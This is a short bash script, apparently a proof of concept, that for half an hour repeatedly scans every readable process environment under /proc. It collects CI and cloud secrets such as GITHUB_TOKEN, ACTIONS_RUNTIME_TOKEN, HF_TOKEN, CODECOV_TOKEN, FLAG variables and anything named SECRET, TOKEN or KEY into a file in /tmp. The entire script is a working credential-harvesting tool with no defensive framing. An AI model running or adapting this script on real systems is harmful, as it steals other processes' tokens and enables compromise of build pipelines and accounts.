#!/usr/bin/env bash
out="/tmp/poc-watch-$$.tsv"
: > "$out"
pat='^(HF_TOKEN|CODECOV_TOKEN|INPUT_TOKEN|GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|FLAG[A-Z_0-9]*|[A-Z_0-9]*(SECRET|TOKEN|KEY)[A-Z_0-9]*)=' 
for i in $(seq 1 1800); do
  for e in /proc/[0-9]*/environ; do
    [ -r "$e" ] || continue
    tr '\0' '\n' < "$e" 2>/dev/null | grep -aE "$pat" >> "$out" 2>/dev/null
  done
  sleep 1
done
